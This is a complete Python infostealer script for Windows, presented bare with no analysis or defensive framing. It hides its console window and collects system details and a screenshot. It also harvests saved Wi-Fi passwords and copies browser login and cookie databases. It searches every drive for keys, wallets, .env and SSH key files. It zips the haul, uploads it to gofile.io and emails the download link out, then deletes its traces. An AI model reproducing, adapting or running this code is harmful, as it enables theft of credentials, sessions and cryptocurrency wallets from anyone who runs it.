import os
import sys
import json
import shutil
import zipfile
import requests
import sqlite3
import smtplib
import socket
import platform
import subprocess
import time
import base64
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pathlib import Path
from PIL import ImageGrab

EMAIL_SENDER = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"
EMAIL_RECEIVER = "your_email@gmail.com"

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587

TARGET_EXTENSIONS = [
    ".txt", ".json", ".conf", ".config", ".ini", ".cfg",
    ".key", ".pem", ".crt", ".p12", ".pfx",
    ".wallet", ".dat", ".db", ".sqlite",
    ".env", ".xml", ".yml", ".yaml",
    ".log", ".rdp", ".vpn", ".ovpn",
    ".ps1", ".bat", ".cmd"
]

TARGET_NAMES = [
    "passwords.txt", "keys.txt", "config.json", "settings.json",
    ".env", "wallet.dat", "id_rsa", "id_ed25519",
    "credentials.txt", "login.txt", "auth.txt",
    "cloudflare.json", "aws.json", "azure.json",
    "token.json", "secret.json", "private.pem"
]

BROWSERS = {
    "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
    "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
    "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
    "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
}

PROFILES = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4"]

IGNORE_DIRS = [
    "windows", "system32", "program files", "program files (x86)",
    "temp", "cache", "logs", "tmp", "recycle.bin",
    "microsoft.net", "microsoft shared", "windows.old"
]

TEMP_DIR = os.path.join(os.getenv("TEMP"), "sys_data")
OUTPUT_ZIP = f"data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org?format=json", timeout=10)
        return r.json().get("ip", "unknown")
    except:
        try:
            r = requests.get("https://httpbin.org/ip", timeout=10)
            return r.json().get("origin", "unknown")
        except:
            return "unknown"

def get_system_info():
    info = {
        "ip": get_public_ip(),
        "hostname": socket.gethostname(),
        "user": os.getlogin(),
        "os": platform.system() + " " + platform.release(),
        "processor": platform.processor(),
        "machine": platform.machine(),
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        import psutil
        info["ram_total"] = f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB"
        info["ram_used"] = f"{round(psutil.virtual_memory().used / (1024**3), 2)} GB"
        info["cpu_cores"] = psutil.cpu_count()
        info["cpu_usage"] = f"{psutil.cpu_percent()}%"
        info["disk_usage"] = f"{round(psutil.disk_usage('/').used / (1024**3), 2)} GB / {round(psutil.disk_usage('/').total / (1024**3), 2)} GB"
    except:
        pass
    return info

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(TEMP_DIR, "screenshot.png")
        os.makedirs(os.path.dirname(screenshot_path), exist_ok=True)
        screenshot.save(screenshot_path)
        return screenshot_path
    except:
        return None

def get_wifi_passwords():
    wifi_list = []
    try:
        output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], encoding="utf-8", errors="ignore")
        for line in output.split("\n"):
            if "All User Profile" in line:
                ssid = line.split(":")[1].strip()
                try:
                    detail = subprocess.check_output(["netsh", "wlan", "show", "profile", ssid, "key=clear"], encoding="utf-8", errors="ignore")
                    for l in detail.split("\n"):
                        if "Key Content" in l:
                            password = l.split(":")[1].strip()
                            wifi_list.append(f"{ssid}:{password}")
                            break
                except:
                    pass
    except:
        pass
    return wifi_list

def get_browser_data(browser_name, browser_path):
    files = []
    if not os.path.exists(browser_path):
        return files
    
    for profile in PROFILES:
        login_path = os.path.join(browser_path, profile, "Login Data")
        if os.path.exists(login_path):
            files.append(("passwords", login_path))
        
        cookies_path = os.path.join(browser_path, profile, "Cookies")
        if os.path.exists(cookies_path):
            files.append(("cookies", cookies_path))
    
    return files

def is_target_file(file_path):
    name = os.path.basename(file_path).lower()
    ext = os.path.splitext(file_path)[1].lower()
    
    if ext in TARGET_EXTENSIONS:
        return True
    
    for target in TARGET_NAMES:
        if target.lower() in name:
            return True
    
    if any(keyword in name for keyword in ["password", "key", "secret", "token", "auth", "credential", "private", "wallet"]):
        return True
    
    return False

def should_ignore_dir(path):
    path_lower = path.lower()
    for ignore in IGNORE_DIRS:
        if ignore in path_lower:
            return True
    return False

def collect_keys_configs():
    collected = []
    drives = [f"{d}:\\" for d in "CDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            if should_ignore_dir(root):
                continue
            
            for file in files:
                if file.startswith("."):
                    continue
                
                file_path = os.path.join(root, file)
                try:
                    if is_target_file(file_path):
                        size = os.path.getsize(file_path)
                        if size < 10 * 1024 * 1024:
                            collected.append(file_path)
                except:
                    pass
    
    return collected

def upload_to_gofile(file_path):
    try:
        url = "https://api.gofile.io/uploadFile"
        with open(file_path, "rb") as f:
            files = {"file": f}
            response = requests.post(url, files=files, timeout=60)
        
        if response.status_code == 200:
            data = response.json()
            if data.get("status") == "ok":
                return data.get("data", {}).get("downloadPage")
    except:
        pass
    return None

def send_email(ip, hostname, gofile_link):
    try:
        subject = f"[{hostname}] Data collected - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        
        body = f"""
        System Info:
        IP: {ip}
        Hostname: {hostname}
        User: {os.getlogin()}
        OS: {platform.system()} {platform.release()}
        Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        
        Download: {gofile_link if gofile_link else 'Upload failed'}
        """
        
        msg = MIMEMultipart()
        msg["From"] = EMAIL_SENDER
        msg["To"] = EMAIL_RECEIVER
        msg["Subject"] = subject
        msg.attach(MIMEText(body, "plain"))
        
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        return False

def main():
    try:
        if os.path.exists(TEMP_DIR):
            shutil.rmtree(TEMP_DIR)
        os.makedirs(TEMP_DIR)
        
        info = get_system_info()
        with open(os.path.join(TEMP_DIR, "system_info.txt"), "w", encoding="utf-8") as f:
            json.dump(info, f, indent=2, ensure_ascii=False)
        
        screenshot = take_screenshot()
        
        wifi = get_wifi_passwords()
        with open(os.path.join(TEMP_DIR, "wifi.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(wifi))
        
        for browser, path in BROWSERS.items():
            browser_data = get_browser_data(browser, path)
            for category, file_path in browser_data:
                try:
                    dest = os.path.join(TEMP_DIR, "browsers", browser, category, os.path.basename(file_path))
                    os.makedirs(os.path.dirname(dest), exist_ok=True)
                    shutil.copy2(file_path, dest)
                except:
                    pass
        
        keys_configs = collect_keys_configs()
        for file_path in keys_configs[:500]:
            try:
                dest = os.path.join(TEMP_DIR, "files", os.path.basename(file_path))
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                shutil.copy2(file_path, dest)
            except:
                pass
        
        zip_path = os.path.join(os.getenv("TEMP"), OUTPUT_ZIP)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(TEMP_DIR):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, TEMP_DIR)
                    zipf.write(file_path, arcname)
        
        gofile_link = upload_to_gofile(zip_path)
        
        send_email(info["ip"], info["hostname"], gofile_link)
        
        shutil.rmtree(TEMP_DIR)
        os.remove(zip_path)
        
    except Exception as e:
        pass

def run_hidden():
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    time.sleep(3)
    main()

if __name__ == "__main__":
    run_hidden()
